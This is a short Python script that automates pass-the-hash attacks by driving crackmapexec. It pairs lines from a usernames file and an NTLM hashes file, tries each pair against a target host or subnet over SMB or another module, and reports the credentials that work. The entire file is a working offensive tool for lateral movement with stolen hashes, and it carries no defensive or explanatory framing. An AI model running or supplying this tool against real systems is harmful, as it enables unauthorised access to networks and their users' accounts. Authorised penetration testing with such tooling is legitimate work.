# Created by Jambi, March 2020
# Perform pass the hash from users and hashes files (each hash to the user in the
# same line in the other file) using crackmapexec

import subprocess
import re
import argparse


def loop(dic, module, target, domain):
    for user, hash in dic.items():
        p = subprocess.check_output(["crackmapexec", module.strip(), target.strip(), "-u", user.strip(), "-H", hash.strip(), "-d", domain.strip()])
        thegoodoutput = re.findall(r'\[\+\].*',p.decode())
        if len(thegoodoutput) != 0:
            print('==== This pair works: {user} : {hash} ====='.format(user=user.strip(), hash=hash.strip()))


def createDict(usersfile, hashesfile):
    users, hashes = open(usersfile, 'r'), open(hashesfile, 'r')
    dic = dict()
    usersl, hashesl = users.readlines(), hashes.readlines()
    for i in range(len(usersl)):
        dic[usersl[i]] = hashesl[i]
    users.close()
    hashes.close()
    return dic


if __name__ == '__main__':

    parser = argparse.ArgumentParser()

    parser.add_argument('--module', '-m', help="Module to run in crackmapexec, default is SMB", type=str, default='smb')
    parser.add_argument('--target', '-t', help="Target machine or subnet with form: xx.xx.xx.xx/xx", type=str, default='')
    parser.add_argument('--domain', '-d', help="Domain, default is local", type=str, default='.')
    parser.add_argument('--users', '-u', help="Users file", type=str, default=0)
    parser.add_argument('--hashes', '-H', help="Hashes file", type=str, default='')

    args = parser.parse_args()

    print("Running with arguments:\n"
          "domain: {domain}\n"
          "target: {target}\n"
          "users file: {users}\n"
          "hashes file: {hashes}\n"
          "module: {module}".format(domain=args.domain, target=args.target, users=args.users, hashes=args.hashes, module=args.module))

    dic = createDict(args.users, args.hashes)
    loop(dic, args.module, args.target, args.domain)
